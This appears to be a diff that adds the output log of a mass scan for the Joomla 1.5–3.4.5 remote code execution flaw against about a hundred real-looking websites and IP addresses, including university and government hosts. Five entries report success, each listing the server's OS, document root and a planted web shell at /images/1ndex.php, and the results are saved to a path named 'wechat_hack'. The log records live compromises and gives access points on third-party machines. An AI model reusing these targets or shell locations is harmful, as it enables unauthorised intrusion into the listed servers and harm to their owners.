@@ -1,0 +1,104 @@
+[23:27:12] [INFO] Checking Joomla 1.5 - 3.4.5 Remote Code Execution...
+[!] no vuls! url: http://biz1global.com/sites/biz1/
+[+] vuls found! url: http://180.177.73.166:80/, System: Windows NT USER-PC 6.1 build 7601 (Windows 7 Home Premium Edition Service Pack 1) i586 , document_root: D:/Apache22/htdocs, script_filename: D:/Apache22/htdocs/index.php, shell_file: http://180.177.73.166:80/images/1ndex.php
+[!] no vuls! url: http://www.odshouse.tw:80/
+[!] connection failed! url: https://180.164.203.106:443/
+[!] no vuls! url: http://www.wings1980.com/our-business/free-wings/
+[+] vuls found! url: http://www.coredatas.com:80/, System: Linux gf25.computing-age.com 2.6.32-573.3.1.el6.x86_64 #1 SMP Thu Aug 13 22:55:16 UTC 2015 x86_64 , document_root: /var/www/html/cavip/www, script_filename: /var/www/html/cavip/www/index.php, shell_file: http://www.coredatas.com:80/images/1ndex.php
+[+] vuls found! url: http://180.149.254.84:80/, System: Linux gf25.computing-age.com 2.6.32-573.3.1.el6.x86_64 #1 SMP Thu Aug 13 22:55:16 UTC 2015 x86_64 , document_root: /var/www/html/cavip/www, script_filename: /var/www/html/cavip/www/index.php, shell_file: http://180.149.254.84:80/images/1ndex.php
+[!] connection failed! url: https://180.166.45.150:443/
+[!] no vuls! url: http://eem.cufe.edu.cn:80/
+[!] no vuls! url: http://123.124.19.111:80/
+[!] connection failed! url: http://www5.cuhk.edu.hk/itsc/ccd/
+[!] connection failed! url: http://180.164.203.106:9080/
+[+] vuls found! url: http://182.61.13.104:80/, System: Windows NT BAIYANGLINCESHI 6.1 build 7601 (Windows Server 2008 R2 Datacenter Edition Service Pack 1) AMD64 , document_root: C:/wamp/www/, script_filename: C:/wamp/www/index.php, shell_file: http://182.61.13.104:80/images/1ndex.php
+[!] no vuls! url: http://124.219.27.3:80/
+[!] no vuls! url: http://www.chinaccys.com:8081/
+[+] vuls found! url: http://122.115.61.205:8080/, System: Windows NT ELFWEB 6.3 build 9200 (Windows Server 2012 R2 Standard Edition) i586 , document_root: C:\inetpub\wwwroot\Joomla, script_filename: C:\inetpub\wwwroot\Joomla\index.php, shell_file: http://122.115.61.205:8080/images/1ndex.php
+[!] no vuls! url: http://125.227.238.111:80/
+[!] no vuls! url: http://125.227.108.176:80/
+[!] no vuls! url: http://i.360.cn/login/?destUrl=http%3A%2F%2Fb.360pay.cn%2Fdefault%2Fauth%3Ft%3D%26c%3D/
+[!] no vuls! url: http://124.128.82.153:80/
+[!] no vuls! url: http://125.227.61.3:2082/
+[!] no vuls! url: http://123.150.41.247:8000/
+[!] connection failed! url: https://123.232.28.146:443/
+[!] connection failed! url: http://policy-harass.cuhk.edu.hk/zh-TW/
+[!] no vuls! url: http://137.189.88.204:80/
+[!] no vuls! url: http://123.193.209.134:80/
+[!] no vuls! url: http://www.feiwomoshu.net:80/
+[!] no vuls! url: http://www.kami2s.com:80/
+[!] no vuls! url: http://www.gzpptc.com:80/
+[!] no vuls! url: http://gzpptc.com:80/
+[!] no vuls! url: http://www.szarxzl114.com:80/
+[!] no vuls! url: http://www.yasusmt.com:80/
+[!] no vuls! url: http://121.201.35.35:80/
+[!] no vuls! url: http://www.jlsanhu.com:80/
+[!] no vuls! url: http://125.32.30.6:80/
+[!] no vuls! url: http://jlsanhu.com:80/
+[!] no vuls! url: http://hachiukin.com:80/
+[!] no vuls! url: http://www.decowood.com.tw:80/
+[!] no vuls! url: http://harwikex.joomlauy.org:80/
+[!] no vuls! url: http://ly36.cn:80/
+[!] no vuls! url: http://dgbethel.com:80/
+[!] no vuls! url: http://www.dgbethel.com:80/
+[!] no vuls! url: http://www.house08.com:80/
+[!] connection failed! url: http://www2.per.cuhk.edu.hk/en-gb/
+[!] connection failed! url: http://123.255.65.143:80/
+[!] no vuls! url: http://www.huifenggzcn.com:80/
+[!] no vuls! url: http://www.syrcw.net/
+[!] no vuls! url: http://video.hengyang.gov.cn/
+[!] no vuls! url: http://www.hnyyrcw.com:80/
+[!] no vuls! url: http://suining.syrcw.net:80/
+[!] no vuls! url: http://suining.syrcw.net:80/
+[!] no vuls! url: http://www.0736zgl.com:80/
+[!] no vuls! url: http://www.0737zgl.com:80/
+[!] no vuls! url: http://www.0730zgl.com:80/
+[!] no vuls! url: http://www.0746zgl.com:80/
+[!] no vuls! url: http://xinshao.syrcw.net:80/
+[!] no vuls! url: http://xinning.syrcw.net:80/
+[!] no vuls! url: http://www.0735zgl.com:80/
+[!] no vuls! url: http://longhui.syrcw.net:80/
+[!] no vuls! url: http://www.wgrsj.cn:80/
+[!] no vuls! url: http://www.wgrsj.cn:80/
+[!] no vuls! url: http://www.0745zgl.com:80/
+[!] no vuls! url: http://www.sdrcscw.com:80/
+[!] no vuls! url: http://www.0744zgl.com:80/
+[!] no vuls! url: http://langusysy.com:80/
+[!] no vuls! url: http://www.0734zgl.com:80/
+[!] no vuls! url: http://www.0738zgl.com:80/
+[!] no vuls! url: http://www.0731zgl.com:80/
+[!] no vuls! url: http://www.langusysy.com:80/
+[!] no vuls! url: http://www.cdlkd.com:80/
+[!] no vuls! url: http://www.citymov.net:80/
+[!] no vuls! url: http://www.xhwjjc.com:80/
+[!] no vuls! url: http://www.szmyanycall.com:80/
+[!] no vuls! url: http://arojade.com:80/
+[!] no vuls! url: http://www.hnfpark.com:80/
+[!] no vuls! url: http://www.znjzjn.com:80/
+[!] no vuls! url: http://www.delsun.com.tw:80/
+[!] connection failed! url: https://www.alumnitrail.alumni.cuhk.edu.hk:443/
+[!] connection failed! url: https://123.255.65.45:443/
+[!] connection failed! url: http://123.255.65.142:80/
+[!] no vuls! url: http://fgyb.org:80/
+[!] no vuls! url: http://123.124.40.41:8090/
+[!] no vuls! url: http://123.124.40.40:8090/
+[!] no vuls! url: http://123.194.163.25:80/
+[!] no vuls! url: http://123.124.40.45:8090/
+[!] no vuls! url: http://123.124.40.43:8090/
+[!] no vuls! url: http://122.225.196.146:8081/
+[!] no vuls! url: http://123.193.171.220:80/
+[!] no vuls! url: http://123.192.154.193:80/
+[!] no vuls! url: http://122.13.213.101:8082/
+[!] no vuls! url: http://123.192.154.193:80/
+[!] no vuls! url: http://122.13.213.101:8082/
+[!] no vuls! url: http://www.ss.pku.edu.cn:80/
+[!] no vuls! url: http://123.194.221.235:80/
+[!] connection failed! url: https://123.194.163.25:443/
+[!] no vuls! url: http://123.138.194.126:880/
+[!] no vuls! url: http://video.ccom.edu.cn:80/
+[!] no vuls! url: http://www.hwats.com.tw:80/
+[!] no vuls! url: http://jieyuzhuzao.com:80/
+[!] no vuls! url: http://hwats.com.tw:80/
+
+[INFO] Scanned Vuls:
+[*] Output File: /root/wechat_hack/wechat/mode/hackUtils/joomla_rce.txt
